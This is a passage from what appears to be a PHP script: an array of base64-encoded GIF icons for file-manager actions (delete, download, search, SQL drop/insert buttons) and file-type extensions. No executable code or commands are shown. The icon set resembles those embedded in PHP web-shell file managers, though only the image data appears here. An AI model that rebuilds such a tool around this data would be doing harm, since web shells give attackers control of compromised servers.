"R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+".

"/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA".

"AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC".

"wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA".

"CHkjE4aQkQ0AlSITan+ZAQqkiiQPj1AFAaMKEKYjD39QrKwKAa8nGQK8Agu/CxTCsCMexsfIxjDL".

"zMshADs=",

"delete"=>

"R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp".

"6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw".

"sGRkZGpOU+IfQ+EQNoh6fdIcPeHh4YWFhbJQYvLy8ui+xm5ubsxccOx8kcM4UtY9WeAdQYmJifWv".

"vHx8fMnJycM3Uf3v8rRue98ONbOzs9YFK5SUlKYoP+Tk5N0oSufn57ZGWsQrR9kIL5CQkOPj42Vl".

"ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5".

"BAEAAFkALAAAAAAUABQAAAesgFmCg4SFhoeIhiUfIImIMlgQB46GLAlYQkaFVVhSAIZLT5cbEYI4".

"STo5MxOfhQwBA1gYChckQBk1OwiIALACLkgxJilTBI69RFhDFh4HDJRZVFgPPFBR0FkNWDdMHA8G".

"BZTaMCISVgMC4IkVWCcaPSi96OqGNFhKI04dgr0QWFcKDL3A4uOIjVZZABxQIWDBLkIEQrRoQsHQ".

"jwVFHBgiEGQFIgQasYkcSbJQIAA7",

"download"=>

"R0lGODlhFAAUALMIAAD/AACAAIAAAMDAwH9/f/8AAP///wAAAP///wAAAAAAAAAAAAAAAAAAAAAA".

"AAAAACH5BAEAAAgALAAAAAAUABQAAAROEMlJq704UyGOvkLhfVU4kpOJSpx5nF9YiCtLf0SuH7pu".

"EYOgcBgkwAiGpHKZzB2JxADASQFCidQJsMfdGqsDJnOQlXTP38przWbX3qgIADs=",

"forward"=>

"R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".

"aLrc/jDK2Qp9xV5WiN5G50FZaRLD6IhE66Lpt3RDbd9CQFSE4P++QW7He7UKPh0IqVw2l0RQSEqt".

"WqsJADs=",

"home"=>

"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA".

"AAAAACH5BAEAAAkALAAAAAAUABQAAAR+MMk5TTWI6ipyMoO3cUWRgeJoCCaLoKO0mq0ZxjNSBDWS".

"krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j".

"VwMrBDZvgF+ChHaGeYiCBQYHCH8VBJaWdAeSl5YiW5+goBIRADs=",

"mode"=>

"R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA".

"AAAAACH5BAEAAAgALAAAAAAdABQAAASBEMlJq70461m6/+AHZMUgnGiqniNWHHAsz3F7FUGu73xO".

"2BZcwGDoEXk/Uq4ICACeQ6fzmXTlns0ddle99b7cFvYpER55Z10Xy1lKt8wpoIsACrdaqBpYEYK/".

"dH1LRWiEe0pRTXBvVHwUd3o6eD6OHASXmJmamJUSY5+gnxujpBIRADs=",

"refresh"=>

"R0lGODlhEQAUALMAAAAAAP////Hx8erq6uPj493d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAA".

"AAAAACH5BAEAAAwALAAAAAARABQAAAR1kMlJq0Q460xR+GAoIMvkheIYlMyJBkJ8lm6YxMKi6zWY".

"3AKCYbjo/Y4EQqFgKIYUh8EvuWQ6PwPFQJpULpunrXZLrYKx20G3oDA7093Esv19q5O/woFu9ZAJ".

"R3lufmWCVX13h3KHfWWMjGBDkpOUTTuXmJgRADs=",

"search"=>

"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//".

"/wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOap".

"s5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsD".

"AkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmr".

"Cbq7C6sIrqawrKwTv68iyA6rDhEAOw==",

"setup"=>

"R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC".

"QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".

"ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB".

"qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE".

"OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==",

"small_dir"=>

"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA".

"AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp".

"/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",

"small_unk"=>

"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1U".

"p9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo".

"/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31".

"/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4".

"/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmP".

"wr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz".

"9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ".

"66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io".

"24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMz".

"aQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpM".

"uSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQC".

"yIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDj".

"yAsokBkQADs=",

"multipage"=>"R0lGODlhCgAMAJEDAP/////3mQAAAAAAACH5BAEAAAMALAAAAAAKAAwAAAIj3IR".

"pJhCODnovidAovBdMzzkixlXdlI2oZpJWEsSywLzRUAAAOw==",

"sort_asc"=>

"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa".

"SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==",

"sort_desc"=>

"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb".

"SLrcOjBCB4UVITgyLt5ch2mgSJZDBi7p6hIJADs=",

"sql_button_drop"=>

"R0lGODlhCQALAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".

"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".

"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".

"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".

"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".

"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".

"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".

"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".

"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".

"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".

"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".

"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".

"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAsA".

"AAg4AP8JREFQ4D+CCBOi4MawITeFCg/iQhEPxcSBlFCoQ5Fx4MSKv1BgRGGMo0iJFC2ehHjSoMt/".

"AQEAOw==",

"sql_button_empty"=>

"R0lGODlhCQAKAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".

"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".

"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".

"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".

"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".

"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".

"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".

"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".

"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".

"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".

"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".

"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".

"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAoA".

"AAgjAP8JREFQ4D+CCBOiMMhQocKDEBcujEiRosSBFjFenOhwYUAAOw==",

"sql_button_insert"=>

"R0lGODlhDQAMAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".

"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".

"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".

"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".

"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".

"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".

"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".

"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".

"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".

"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".

"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".

"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".

"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAANAAwA".

"AAgzAFEIHEiwoMGDCBH6W0gtoUB//1BENOiP2sKECzNeNIiqY0d/FBf+y0jR48eQGUc6JBgQADs=",

"up"=>

"R0lGODlhFAAUALMAAAAAAP////j4+OPj493d3czMzLKysoaGhk1NTf///wAAAAAAAAAAAAAAAAAA".

"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJq734ns1PnkcgjgXwhcNQrIVhmFonzxwQjnie27jg".

"+4Qgy3XgBX4IoHDlMhRvggFiGiSwWs5XyDftWplEJ+9HQCyx2c1YEDRfwwfxtop4p53PwLKOjvvV".

"IXtdgwgdPGdYfng1IVeJaTIAkpOUlZYfHxEAOw==",

"write"=>

"R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA".

"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze".

"EQYQLUAsGgM0Wwt3bCJfQSFx10yyBlJn8RfEMgM9X+3qHWq5iED5yCsMCl111knDpuXfYls+IK61".

"LXd+WWEHLUd/ToJFZQOOj5CRjiCBlZaXIBEAOw==",

"ext_asp"=>

"R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/".

"/////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgI".

"D6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=",

"ext_mp3"=>

"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".

"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".

"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",

"ext_avi"=>

"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANM".

"WFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4".

"PYXCyg+V2i44XeRmSfYqsGhAAgA7",

"ext_cgi"=>

"R0lGODlhEAAQAGYAACH5BAEAAEwALAAAAAAQABAAhgAAAJtqCHd3d7iNGa+HMu7er9GiC6+IOOu9".

"DkJAPqyFQql/N/Dlhsyyfe67Af/SFP/8kf/9lD9ETv/PCv/cQ//eNv/XIf/ZKP/RDv/bLf/cMah6".

"LPPYRvzgR+vgx7yVMv/lUv/mTv/fOf/MAv/mcf/NA//qif/MAP/TFf/xp7uZVf/WIP/OBqt/Hv/S".

"Ev/hP+7OOP/WHv/wbHNfP4VzV7uPFv/pV//rXf/ycf/zdv/0eUNJWENKWsykIk9RWMytP//4iEpQ".

"Xv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAeegEyCg0wBhIeHAYqIjAEwhoyEAQQXBJCRhQMuA5eSiooGIwafi4UM".

"BagNFBMcDR4FQwwBAgEGSBBEFSwxNhAyGg6WAkwCBAgvFiUiOBEgNUc7w4ICND8PKCFAOi0JPNKD".

"AkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAi".

"RYtMAgEAOw==",

"ext_cmd"=>

"R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI".

"eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN".

"dmrYAMn1onq/YKpjvEgAADs=",

"ext_cpp"=>

"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANC".

"WLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4Ra".

"Eq7YrLDE7a4SADs=",

"ext_ini"=>

"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANL".

"aArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VM".

"SnEjgPVarHEHgrB43JvszsQEADs=",

"ext_diz"=>

"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAP///15phcfb6NLs/7Pc/+P0/3J+l9bs".

"/52nuqjK5/n///j///7///r//0trlsPn/8nn/8nZ5trm79nu/8/q/9Xt/9zw/93w/+j1/9Hr/+Dv".

"/d7v/73H0MjU39zu/9br/8ne8tXn+K6/z8Xj/LjV7dDp/6K4y8bl/5O42Oz2/7HW9Ju92u/9/8T3".

"/+L//+7+/+v6/+/6/9H4/+X6/+Xl5Pz//+/t7fX08vD//+3///P///H///P7/8nq/8fp/8Tl98zr".

"/+/z9vT4++n1/b/k/dny/9Hv/+v4/9/0/9fw/8/u/8vt/+/09xUvXhQtW4KTs2V1kw4oVTdYpDZX".

"pVxqhlxqiExkimKBtMPL2Ftvj2OV6aOuwpqlulyN3cnO1wAAXQAAZSM8jE5XjgAAbwAAeURBYgAA".

"dAAAdzZEaE9wwDZYpmVviR49jG12kChFmgYuj6+1xeLn7Nzj6pm20oeqypS212SJraCyxZWyz7PW".

"9c/o/87n/8DX7MHY7q/K5LfX9arB1srl/2+fzq290U14q7fCz6e2yXum30FjlClHc4eXr6bI+bTK".

"4rfW+NXe6Oby/5SvzWSHr+br8WuKrQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAjgACsJrDRHSICDQ7IMXDgJx8EvZuIcbPBooZwbBwOMAfMmYwBCA2sEcNBjJCMYATLIOLiokocm".

"C1QskAClCxcGBj7EsNHoQAciSCC1mNAmjJgGGEBQoBHigKENBjhcCBAIzRoGFkwQMNKnyggRSRAg".

"2BHpDBUeewRV0PDHCp4BSgjw0ZGHzJQcEVD4IEHJzYkBfo4seYGlDBwgTCAAYvFE4KEBJYI4UrPF".

"CyIIK+woYjMwQQI6Cor8mKEnxR0nAhYKjHJFQYECkqSkSa164IM6LhLRrr3wwaBCu3kPFKCldkAA".

"Ow==",

"ext_doc"=>

"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANR".

"WErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmq".

"MIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=",

"ext_exe"=>

"R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7".

"WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt".

"xhIAOw==",

"ext_h"=>

"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANB".

"WLPc9XCASScZ8MlKCcARRwVkEAKCIBKmNqVrq7wpbMmbbbOnrgI8F+q3w9GOQOMQGZyJOspnMkKo".

"Wq/NknbbSgAAOw==",

"ext_hpp"=>

"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANF".

"WLPc9XCASScZ8MlKicobBwRkEAGCIAKEqaFqpbZnmk42/d43yroKmLADlPBis6LwKNAFj7jfaWVR".

"UqUagnbLdZa+YFcCADs=",

"ext_htaccess"=>

"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6".

"WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJ".

"AAA7",

"ext_html"=>

"R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz".

"c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P".

"KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk".

"Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR".

"ADs=",

"ext_jpg"=>

"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci".

"Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd".

"FxEAOw==",

"ext_js"=>

"R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH".

"k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs".

"a00AjYYBbc/o9HjNniUAADs=",

"ext_lnk"=>

"R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjO".

"NSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHzi".

"Uww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABk".

"AAAgAAAwAABfADe0GxeLCxZcDEK6IUuxKFjFLE3AJ2HHMRKiCQWCAgBmABptDg+HCBZeDAqFBWDG".

"MymUFQpWBj2fJhdvDQhOBC6XF3fdR0O6IR2ODwAZAHPZQCSREgASADaXHwAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAeZgFBQPAGFhocAgoI7Og8JCgsEBQIWPQCJgkCOkJKUP5eYUD6PkZM5".

"NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf".

"1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQ".

"ADs=",

"ext_log"=>

"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wN".

"zLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==",

"ext_php"=>

